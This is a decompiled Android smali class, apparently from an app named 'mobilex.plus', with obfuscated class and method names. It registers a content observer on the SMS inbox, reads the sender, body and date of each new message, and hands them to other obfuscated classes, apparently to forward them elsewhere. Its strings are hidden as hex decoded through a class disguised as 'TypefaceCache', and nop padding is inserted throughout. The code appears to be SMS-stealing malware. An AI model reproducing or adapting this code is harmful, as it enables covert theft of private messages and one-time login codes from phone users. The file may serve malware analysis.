.class public final Lv/s/s6gkfffFcXvYHWNdDTq;
.super Landroid/database/ContentObserver;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# static fields
.field public static final synthetic vekpFI4d1Nc4fakF:I

.field public static volatile w9sT1Swbhx3hs:J


# instance fields
.field public final dDIMxZXP1V8HdM:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .line 1
    const-string v0, "000000770058008F00F5009600FF009000310077004B009700F500AD"

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    const-wide/16 v0, -0x1

    .line 7
    .line 8
    sput-wide v0, Lv/s/s6gkfffFcXvYHWNdDTq;->w9sT1Swbhx3hs:J

    .line 9
    .line 10
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 2
    .line 3
    .line 4
    iput-object p1, p0, Lv/s/s6gkfffFcXvYHWNdDTq;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 5
    .line 6
    return-void
.end method

.method public static final dDIMxZXP1V8HdM(Lv/s/s6gkfffFcXvYHWNdDTq;Lv/s/CWIOrUfHtKyaxQib0W;)Ljava/lang/Object;
    .locals 27

    .line 1
    move-object/from16 v0, p0

    nop

    nop

    .line 2
    .line 3
    move-object/from16 v1, p1

    .line 4
    .line 5
    sget-object v2, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    .line 6
    .line 7
    instance-of v3, v1, Lv/s/Euc6m5W5qr5UEY;

    .line 8
    .line 9
    if-eqz v3, :cond_0

    .line 10
    .line 11
    move-object v3, v1

    .line 12
    check-cast v3, Lv/s/Euc6m5W5qr5UEY;

    .line 13
    .line 14
    iget v4, v3, Lv/s/Euc6m5W5qr5UEY;->wotphlvK9sPbXJ:I

    .line 15
    .line 16
    const/high16 v5, -0x80000000

    .line 17
    .line 18
    and-int v6, v4, v5

    .line 19
    .line 20
    if-eqz v6, :cond_0

    .line 21
    .line 22
    sub-int/2addr v4, v5

    .line 23
    iput v4, v3, Lv/s/Euc6m5W5qr5UEY;->wotphlvK9sPbXJ:I

    .line 24
    .line 25
    goto/16 :goto_0

    .line 26
    :cond_0
    new-instance v3, Lv/s/Euc6m5W5qr5UEY;

    .line 27
    .line 28
    invoke-direct {v3, v0, v1}, Lv/s/Euc6m5W5qr5UEY;-><init>(Lv/s/s6gkfffFcXvYHWNdDTq;Lv/s/CWIOrUfHtKyaxQib0W;)V

    .line 29
    .line 30
    .line 31
    :goto_0
    iget-object v1, v3, Lv/s/Euc6m5W5qr5UEY;->gmNWMfvn6zlEj:Ljava/lang/Object;

    .line 32
    .line 33
    sget-object v4, Lv/s/pjN1L01KDMWnPCy0daD;->w9sT1Swbhx3hs:Lv/s/pjN1L01KDMWnPCy0daD;

    .line 34
    .line 35
    iget v5, v3, Lv/s/Euc6m5W5qr5UEY;->wotphlvK9sPbXJ:I

    .line 36
    .line 37
    const-string v6, "002A00780058008800FD00B600DC00A0"

    .line 38
    .line 39
    const-string v7, "date"

    .line 40
    .line 41
    const-string v8, "body"

    .line 42
    .line 43
    const-string v9, "address"

    .line 44
    .line 45
    const/4 v10, 0x1

    .line 46
    const-string v11, "_id"

    .line 47
    .line 48
    if-eqz v5, :cond_2

    .line 49
    .line 50
    if-ne v5, v10, :cond_1

    .line 51
    .line 52
    iget-wide v12, v3, Lv/s/Euc6m5W5qr5UEY;->hjneShqpF9Tis4:J

    .line 53
    .line 54
    iget-wide v14, v3, Lv/s/Euc6m5W5qr5UEY;->D5P1xCAyuvgF:J

    .line 55
    .line 56
    iget-object v0, v3, Lv/s/Euc6m5W5qr5UEY;->pyu8ovAipBTLYAiKab:Ljava/lang/String;

    .line 57
    .line 58
    iget-object v5, v3, Lv/s/Euc6m5W5qr5UEY;->b1EoSIRjJHO5:Ljava/lang/String;

    .line 59
    .line 60
    iget-object v10, v3, Lv/s/Euc6m5W5qr5UEY;->ibVTtJUNfrGYbW:Landroid/database/Cursor;

    .line 61
    .line 62
    move-object/from16 v16, v1

    .line 63
    .line 64
    iget-object v1, v3, Lv/s/Euc6m5W5qr5UEY;->xDyLpEZyrcKVe0:Ljava/io/Closeable;

    nop

    nop

    .line 65
    .line 66
    move-object/from16 p0, v0

    .line 67
    .line 68
    iget-object v0, v3, Lv/s/Euc6m5W5qr5UEY;->Ee8d2j4S9Vm5yGuR:Lv/s/s6gkfffFcXvYHWNdDTq;

    .line 69
    .line 70
    :try_start_0
    invoke-static/range {v16 .. v16}, Lv/s/SbxdZ6Kq2uhHQ5RPRqm;->xfn2GJwmGqs7kWW(Ljava/lang/Object;)V

    .line 71
    .line 72
    .line 73
    move-object/from16 v17, v0

    .line 74
    .line 75
    move-object/from16 v0, v16

    .line 76
    .line 77
    check-cast v0, Lv/s/roAK4OF9CtSmlCJgpQ;

    .line 78
    .line 79
    iget-object v0, v0, Lv/s/roAK4OF9CtSmlCJgpQ;->w9sT1Swbhx3hs:Ljava/lang/Object;

    nop

    nop
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 80
    .line 81
    move-object/from16 v21, v2

    .line 82
    .line 83
    move-object/from16 v22, v6

    nop

    .line 84
    .line 85
    move-wide/from16 v18, v14

    .line 86
    .line 87
    move-object/from16 v14, p0

    .line 88
    .line 89
    move-object/from16 v2, v1

    .line 90
    move-object/from16 v15, v5

    .line 91
    move-object/from16 v1, v17

    .line 92
    .line 93
    move-object v5, v0

    .line 94
    const/4 v0, 0x1

    .line 95
    goto/16 :goto_6

    .line 96
    .line 97
    :catchall_0
    move-exception v0

    .line 98
    move-object/from16 v21, v2

    .line 99
    .line 100
    :goto_1
    move-object/from16 v2, v1

    .line 101
    :goto_2
    move-object/from16 v1, v0

    .line 102
    goto/16 :goto_a

    .line 103
    .line 104
    :cond_1
    new-instance v0, Ljava/lang/IllegalStateException;

    .line 105
    .line 106
    const-string v1, "call to \'resume\' before \'invoke\' with coroutine"

    .line 107
    .line 108
    invoke-direct {v0, v1}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    .line 109
    .line 110
    .line 111
    throw v0

    .line 112
    :cond_2
    move-object/from16 v16, v1

    .line 113
    .line 114
    invoke-static/range {v16 .. v16}, Lv/s/SbxdZ6Kq2uhHQ5RPRqm;->xfn2GJwmGqs7kWW(Ljava/lang/Object;)V

    .line 115
    .line 116
    .line 117
    sget-wide v12, Lv/s/s6gkfffFcXvYHWNdDTq;->w9sT1Swbhx3hs:J

    .line 118
    .line 119
    const-wide/16 v14, 0x0

    nop

    .line 120
    .line 121
    cmp-long v1, v12, v14

    .line 122
    .line 123
    if-gtz v1, :cond_3

    .line 124
    .line 125
    :goto_3
    move-object/from16 v21, v2

    .line 126
    .line 127
    goto/16 :goto_d

    .line 128
    .line 129
    :cond_3
    :try_start_1
    iget-object v1, v0, Lv/s/s6gkfffFcXvYHWNdDTq;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 130
    .line 131
    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 132
    .line 133
    .line 134
    move-result-object v12

    .line 135
    sget-object v13, Landroid/provider/Telephony$Sms$Inbox;->CONTENT_URI:Landroid/net/Uri;

    .line 136
    .line 137
    filled-new-array {v11, v9, v8, v7}, [Ljava/lang/String;

    .line 138
    .line 139
    .line 140
    move-result-object v14

    .line 141
    const-string v1, "00630028001B00D8"

    .line 142
    .line 143
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 144
    .line 145
    .line 146
    move-result-object v1

    nop

    nop

    .line 147
    new-instance v5, Ljava/lang/StringBuilder;

    .line 148
    .line 149
    invoke-direct {v5, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 150
    .line 151
    .line 152
    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 153
    .line 154
    .line 155
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 156
    .line 157
    .line 158
    move-result-object v15

    .line 159
    sget-wide v16, Lv/s/s6gkfffFcXvYHWNdDTq;->w9sT1Swbhx3hs:J

    .line 160
    .line 161
    invoke-static/range {v16 .. v17}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    .line 162
    .line 163
    .line 164
    move-result-object v1

    .line 165
    filled-new-array {v1}, [Ljava/lang/String;

    .line 166
    .line 167
    .line 168
    move-result-object v16

    .line 169
    const-string v1, "00630057006800A4"

    nop

    .line 170
    .line 171
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 172
    .line 173
    .line 174
    move-result-object v1

    .line 175
    new-instance v5, Ljava/lang/StringBuilder;

    .line 176
    .line 177
    invoke-direct {v5, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 178
    .line 179
    .line 180
    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 181
    .line 182
    .line 183
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 184
    .line 185
    .line 186
    move-result-object v17

    .line 187
    invoke-virtual/range {v12 .. v17}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    .line 188
    .line 189
    .line 190
    move-result-object v1
    :try_end_1
    .catch Ljava/lang/SecurityException; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 191
    if-nez v1, :cond_4

    .line 192
    .line 193
    goto :goto_3

    .line 194
    :cond_4
    move-object/from16 v10, v1

    .line 195
    :goto_4
    :try_start_2
    invoke-interface {v10}, Landroid/database/Cursor;->moveToNext()Z

    .line 196
    .line 197
    .line 198
    move-result v5

    .line 199
    if-eqz v5, :cond_b

    .line 200
    .line 201
    invoke-interface {v10, v11}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    .line 202
    .line 203
    .line 204
    move-result v5

    nop

    nop

    .line 205
    invoke-interface {v10, v5}, Landroid/database/Cursor;->getLong(I)J

    .line 206
    .line 207
    .line 208
    move-result-wide v12

    .line 209
    invoke-interface {v10, v9}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    .line 210
    .line 211
    .line 212
    move-result v5

    .line 213
    invoke-interface {v10, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 214
    .line 215
    .line 216
    move-result-object v5

    .line 217
    if-nez v5, :cond_5

    .line 218
    .line 219
    const-string v5, "001600780050008900FF00A800DC"

    .line 220
    .line 221
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 222
    .line 223
    .line 224
    move-result-object v5

    .line 225
    :cond_5
    move-object/from16 v16, v5

    .line 226
    .line 227
    invoke-interface {v10, v8}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    .line 228
    .line 229
    .line 230
    move-result v5

    .line 231
    invoke-interface {v10, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 232
    .line 233
    .line 234
    move-result-object v5

    .line 235
    if-nez v5, :cond_6

    .line 236
    .line 237
    const-string v5, ""

    .line 238
    .line 239
    :cond_6
    move-object/from16 v14, v5

    nop

    .line 240
    invoke-interface {v10, v7}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    .line 241
    .line 242
    .line 243
    move-result v5

    .line 244
    invoke-interface {v10, v5}, Landroid/database/Cursor;->getLong(I)J

    .line 245
    .line 246
    .line 247
    move-result-wide v18

    .line 248
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    .line 249
    .line 250
    .line 251
    move-result-object v5

    .line 252
    invoke-virtual {v5}, Ljava/lang/Thread;->getName()Ljava/lang/String;

    .line 253
    .line 254
    .line 255
    invoke-static {v14}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 256
    .line 257
    .line 258
    move-result v5

    .line 259
    if-nez v5, :cond_a

    .line 260
    .line 261
    move-object/from16 v17, v14

    .line 262
    .line 263
    sget-object v14, Lv/s/WMx7O1yIuvMieNw;->dDIMxZXP1V8HdM:Lv/s/WMx7O1yIuvMieNw;

    .line 264
    .line 265
    iget-object v15, v0, Lv/s/s6gkfffFcXvYHWNdDTq;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 266
    .line 267
    invoke-virtual/range {v14 .. v19}, Lv/s/WMx7O1yIuvMieNw;->Ee8d2j4S9Vm5yGuR(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;J)Z

    .line 268
    .line 269
    .line 270
    move-result v5
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 271
    move-object/from16 v21, v2

    .line 272
    .line 273
    move/from16 p0, v5

    .line 274
    .line 275
    move-object/from16 v2, v16

    .line 276
    .line 277
    move-object/from16 v5, v17

    .line 278
    .line 279
    move-wide/from16 v14, v18

    .line 280
    .line 281
    if-eqz p0, :cond_7

    .line 282
    .line 283
    :try_start_3
    sput-wide v12, Lv/s/s6gkfffFcXvYHWNdDTq;->w9sT1Swbhx3hs:J

    .line 284
    .line 285
    :goto_5
    move-object/from16 p0, v0

    .line 286
    .line 287
    move-object/from16 v19, v3

    .line 288
    .line 289
    move-object/from16 v22, v6

    .line 290
    .line 291
    goto/16 :goto_9

    .line 292
    .line 293
    :catchall_1
    move-exception v0

    .line 294
    goto/16 :goto_1

    .line 295
    .line 296
    :cond_7
    const-string v16, "000000790055009300F500B100C6008800210065005E009500E600BA00C000E700200077004E008000F800AB009200A900260061001B00B400DD008C009200A100310079005600C7"

    .line 297
    .line 298
    invoke-static/range {v16 .. v16}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 299
    .line 300
    .line 301
    const-string v16, "0063003E0052008300AD"

    .line 302
    .line 303
    invoke-static/range {v16 .. v16}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 304
    .line 305
    .line 306
    sget-object v16, Lv/s/ktukzhfmAkOuMU;->dDIMxZXP1V8HdM:Lv/s/ktukzhfmAkOuMU;

    .line 307
    .line 308
    move-object/from16 v22, v6

    .line 309
    .line 310
    iget-object v6, v0, Lv/s/s6gkfffFcXvYHWNdDTq;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 311
    .line 312
    invoke-static/range {v22 .. v22}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 313
    .line 314
    .line 315
    move-result-object v16

    .line 316
    move-object/from16 v17, v6

    .line 317
    .line 318
    new-instance v6, Ljava/lang/Long;

    .line 319
    .line 320
    invoke-direct {v6, v14, v15}, Ljava/lang/Long;-><init>(J)V

    .line 321
    .line 322
    .line 323
    const-string v18, "002C00740048008200E200A900D700B5"

    .line 324
    .line 325
    invoke-static/range {v18 .. v18}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 326
    .line 327
    .line 328
    move-result-object v18

    .line 329
    iput-object v0, v3, Lv/s/Euc6m5W5qr5UEY;->Ee8d2j4S9Vm5yGuR:Lv/s/s6gkfffFcXvYHWNdDTq;

    .line 330
    .line 331
    iput-object v1, v3, Lv/s/Euc6m5W5qr5UEY;->xDyLpEZyrcKVe0:Ljava/io/Closeable;

    .line 332
    .line 333
    iput-object v10, v3, Lv/s/Euc6m5W5qr5UEY;->ibVTtJUNfrGYbW:Landroid/database/Cursor;

    .line 334
    .line 335
    iput-object v5, v3, Lv/s/Euc6m5W5qr5UEY;->b1EoSIRjJHO5:Ljava/lang/String;

    .line 336
    .line 337
    iput-object v2, v3, Lv/s/Euc6m5W5qr5UEY;->pyu8ovAipBTLYAiKab:Ljava/lang/String;

    nop

    nop

    .line 338
    .line 339
    iput-wide v12, v3, Lv/s/Euc6m5W5qr5UEY;->D5P1xCAyuvgF:J

    .line 340
    .line 341
    iput-wide v14, v3, Lv/s/Euc6m5W5qr5UEY;->hjneShqpF9Tis4:J

    .line 342
    .line 343
    move-object/from16 p0, v0

    .line 344
    .line 345
    const/16 v0, 0x1

    nop

    .line 346
    iput v0, v3, Lv/s/Euc6m5W5qr5UEY;->wotphlvK9sPbXJ:I

    .line 347
    .line 348
    move-wide/from16 v19, v14

    .line 349
    .line 350
    move-object/from16 v15, v16

    .line 351
    .line 352
    const/16 v16, 0x0

    .line 353
    .line 354
    move-wide/from16 v23, v19

    .line 355
    .line 356
    const v20, 0x80

    .line 357
    .line 358
    move-object/from16 v19, v3

    .line 359
    .line 360
    move-object/from16 v14, v5

    .line 361
    move-wide/from16 v25, v12

    .line 362
    .line 363
    move-object/from16 v13, v2

    nop

    nop

    .line 364
    move-wide/from16 v2, v25

    .line 365
    .line 366
    move-object/from16 v12, v17

    .line 367
    .line 368
    move-object/from16 v17, v6

    .line 369
    .line 370
    invoke-static/range {v12 .. v20}, Lv/s/ktukzhfmAkOuMU;->EWUjsTERgdPbSw3NNlN(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILjava/lang/Long;Ljava/lang/String;Lv/s/CWIOrUfHtKyaxQib0W;I)Ljava/lang/Object;

    .line 371
    .line 372
    .line 373
    move-result-object v5
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 374
    move-object/from16 v16, v13

    .line 375
    .line 376
    move-object/from16 v17, v14

    .line 377
    .line 378
    if-ne v5, v4, :cond_8

    .line 379
    .line 380
    return-object v4

    .line 381
    :cond_8
    move-wide v12, v2

    .line 382
    move-object/from16 v3, v19

    .line 383
    .line 384
    move-wide/from16 v18, v12

    .line 385
    .line 386
    move-object v2, v1

    .line 387
    move-object/from16 v14, v16

    .line 388
    .line 389
    move-object/from16 v15, v17

    .line 390
    .line 391
    move-wide/from16 v12, v23

    .line 392
    .line 393
    move-object/from16 v1, p0

    .line 394
    .line 395
    :goto_6
    :try_start_4
    instance-of v5, v5, Lv/s/VSZeS5mia3yEXbAe;

    .line 396
    .line 397
    if-eqz v5, :cond_9

    .line 398
    .line 399
    sget-object v5, Lv/s/WMx7O1yIuvMieNw;->dDIMxZXP1V8HdM:Lv/s/WMx7O1yIuvMieNw;

    .line 400
    .line 401
    iget-object v6, v1, Lv/s/s6gkfffFcXvYHWNdDTq;->dDIMxZXP1V8HdM:Landroid/content/Context;

    nop

    .line 402
    .line 403
    invoke-static/range {v22 .. v22}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 404
    .line 405
    .line 406
    move-result-object v16

    .line 407
    new-instance v0, Ljava/lang/Long;

    .line 408
    .line 409
    invoke-direct {v0, v12, v13}, Ljava/lang/Long;-><init>(J)V

    .line 410
    .line 411
    .line 412
    move-object/from16 v17, v0

    .line 413
    .line 414
    move-object v12, v5

    .line 415
    move-object v13, v6

    .line 416
    invoke-virtual/range {v12 .. v17}, Lv/s/WMx7O1yIuvMieNw;->vekpFI4d1Nc4fakF(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Long;)V

    .line 417
    .line 418
    .line 419
    goto/16 :goto_7

    .line 420
    :catchall_2
    move-exception v0

    .line 421
    goto/16 :goto_2

    .line 422
    .line 423
    :cond_9
    :goto_7
    sput-wide v18, Lv/s/s6gkfffFcXvYHWNdDTq;->w9sT1Swbhx3hs:J
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 424
    .line 425
    move-object v0, v1

    .line 426
    move-object/from16 v1, v2

    .line 427
    :goto_8
    move-object/from16 v2, v21

    .line 428
    .line 429
    move-object/from16 v6, v22

    .line 430
    .line 431
    goto/16 :goto_4

    .line 432
    .line 433
    :cond_a
    move-object/from16 v21, v2

    .line 434
    .line 435
    goto/16 :goto_5

    .line 436
    .line 437
    :goto_9
    move-object/from16 v0, p0

    .line 438
    .line 439
    move-object/from16 v3, v19

    .line 440
    .line 441
    goto :goto_8

    .line 442
    :cond_b
    move-object/from16 v21, v2

    .line 443
    .line 444
    const/4 v0, 0x0

    .line 445
    :try_start_5
    invoke-static {v1, v0}, Lv/s/okc5AGRjqrud84oM6d;->Ee8d2j4S9Vm5yGuR(Ljava/io/Closeable;Ljava/lang/Throwable;)V
    :try_end_5
    .catch Ljava/lang/SecurityException; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    .line 446
    .line 447
    .line 448
    return-object v21

    .line 449
    :catch_0
    move-exception v0

    .line 450
    goto/16 :goto_b

    .line 451
    :catch_1
    move-exception v0

    .line 452
    goto/16 :goto_c

    .line 453
    :goto_a
    :try_start_6
    throw v1
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    .line 454
    :catchall_3
    move-exception v0

    nop

    nop

    .line 455
    :try_start_7
    invoke-static {v2, v1}, Lv/s/okc5AGRjqrud84oM6d;->Ee8d2j4S9Vm5yGuR(Ljava/io/Closeable;Ljava/lang/Throwable;)V

    .line 456
    .line 457
    .line 458
    throw v0
    :try_end_7
    .catch Ljava/lang/SecurityException; {:try_start_7 .. :try_end_7} :catch_1
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0

    .line 459
    :catch_2
    move-exception v0

    nop

    nop

    .line 460
    move-object/from16 v21, v2

    .line 461
    .line 462
    goto :goto_b

    .line 463
    :catch_3
    move-exception v0

    .line 464
    move-object/from16 v21, v2

    .line 465
    .line 466
    goto :goto_c

    .line 467
    :goto_b
    const-string v1, "00310073005A008300DE00BA00C5008E002D00740054009F00DD00BA00C100B400220071005E009400B000BA00C000B5002C0064000100C7"

    .line 468
    .line 469
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 470
    .line 471
    .line 472
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 473
    .line 474
    .line 475
    goto :goto_d

    .line 476
    :goto_c
    const-string v1, "000D0079001B00B500D5009E00F600980010005B006800C700E000BA00C000AA002A00650048008E00FF00B1008800E7"

    .line 477
    .line 478
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 479
    .line 480
    .line 481
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 482
    .line 483
    .line 484
    :goto_d
    return-object v21

    nop

    nop
.end method


# virtual methods
.method public final onChange(ZLandroid/net/Uri;)V
    .locals 2

    .line 1
    invoke-super {p0, p1, p2}, Landroid/database/ContentObserver;->onChange(ZLandroid/net/Uri;)V

    .line 2
    .line 3
    .line 4
    sget-wide p1, Lv/s/s6gkfffFcXvYHWNdDTq;->w9sT1Swbhx3hs:J

    .line 5
    .line 6
    const-wide/16 v0, 0x0

    .line 7
    .line 8
    cmp-long p1, p1, v0

    .line 9
    .line 10
    if-gtz p1, :cond_0

    .line 11
    .line 12
    invoke-virtual {p0}, Lv/s/s6gkfffFcXvYHWNdDTq;->w9sT1Swbhx3hs()V

    .line 13
    .line 14
    .line 15
    return-void

    .line 16
    :cond_0
    sget-object p1, Lv/s/umMdYoePNXvWWPn;->w9sT1Swbhx3hs:Lv/s/oT0hSL7wye6TP1X12yCL;

    .line 17
    .line 18
    invoke-static {p1}, Lv/s/jb8et6SZeK5TWMrJFxDX;->dDIMxZXP1V8HdM(Lv/s/cpTq2XMCb5JSaEhn;)Lv/s/f58wUe2vbJhag6PETTG;

    .line 19
    .line 20
    .line 21
    move-result-object p1

    .line 22
    new-instance p2, Lv/s/eyavN4VgkDpngkAKt;

    .line 23
    .line 24
    const/4 v0, 0x0

    .line 25
    const/16 v1, 0x0

    .line 26
    invoke-direct {p2, p0, v1, v0}, Lv/s/eyavN4VgkDpngkAKt;-><init>(Ljava/lang/Object;Lv/s/b9xRoaXFR1fmOO2Q;I)V

    .line 27
    .line 28
    .line 29
    const/16 v0, 0x3

    .line 30
    invoke-static {p1, v1, p2, v0}, Lv/s/y6jRGLEWNMir;->b1EoSIRjJHO5(Lv/s/wh3Lv6S5rs6zqjV;Lv/s/oT0hSL7wye6TP1X12yCL;Lv/s/NhN5GSKLYh6STld4;I)Lv/s/snDbSR9Gb3eZZuB;

    .line 31
    .line 32
    .line 33
    return-void
.end method

.method public final w9sT1Swbhx3hs()V
    .locals 8

    .line 1
    const-string v0, "_id"

    .line 2
    .line 3
    :try_start_0
    iget-object v1, p0, Lv/s/s6gkfffFcXvYHWNdDTq;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 4
    .line 5
    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 6
    .line 7
    .line 8
    move-result-object v2

    .line 9
    sget-object v3, Landroid/provider/Telephony$Sms$Inbox;->CONTENT_URI:Landroid/net/Uri;

    .line 10
    .line 11
    filled-new-array {v0}, [Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    move-result-object v4

    nop

    .line 15
    const-string v1, "00630052007E00B400D300FF00FE008E000E005F006F00C700A1"

    .line 16
    .line 17
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 18
    .line 19
    .line 20
    move-result-object v1

    .line 21
    new-instance v5, Ljava/lang/StringBuilder;

    .line 22
    .line 23
    invoke-direct {v5, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 24
    .line 25
    .line 26
    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 27
    .line 28
    .line 29
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 30
    .line 31
    .line 32
    move-result-object v7

    .line 33
    const/16 v5, 0x0

    .line 34
    const/16 v6, 0x0

    .line 35
    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    .line 36
    .line 37
    .line 38
    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 39
    if-eqz v1, :cond_1

    .line 40
    .line 41
    :try_start_1
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    .line 42
    .line 43
    .line 44
    move-result v0

    .line 45
    if-eqz v0, :cond_0

    nop

    .line 46
    .line 47
    const/16 v0, 0x0

    .line 48
    invoke-interface {v1, v0}, Landroid/database/Cursor;->getLong(I)J

    .line 49
    .line 50
    .line 51
    move-result-wide v2

    .line 52
    sput-wide v2, Lv/s/s6gkfffFcXvYHWNdDTq;->w9sT1Swbhx3hs:J

    .line 53
    .line 54
    const-string v0, "000A00780052009300F900BE00DE00AE00390073005F00C700FC00BE00C100B3001300640054008400F500AC00C100A20027005F005F00DA"

    .line 55
    .line 56
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 57
    .line 58
    .line 59
    goto :goto_0

    .line 60
    :catchall_0
    move-exception v0

    .line 61
    move-object/from16 v2, v0

    .line 62
    goto :goto_1

    .line 63
    :cond_0
    :goto_0
    :try_start_2
    invoke-interface {v1}, Ljava/io/Closeable;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 64
    .line 65
    .line 66
    return-void

    .line 67
    :catch_0
    move-exception v0

    nop

    .line 68
    goto/16 :goto_2

    .line 69
    :goto_1
    :try_start_3
    throw v2
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 70
    :catchall_1
    move-exception v0

    .line 71
    :try_start_4
    invoke-static {v1, v2}, Lv/s/okc5AGRjqrud84oM6d;->Ee8d2j4S9Vm5yGuR(Ljava/io/Closeable;Ljava/lang/Throwable;)V

    .line 72
    .line 73
    .line 74
    throw v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 75
    :cond_1
    return-void

    .line 76
    :goto_2
    const-string v1, "002A00780052009300DC00BE00C100B3000A0072001B008200E200AD00DD00B500790036"

    .line 77
    .line 78
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 79
    .line 80
    .line 81
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 82
    .line 83
    .line 84
    return-void
.end method
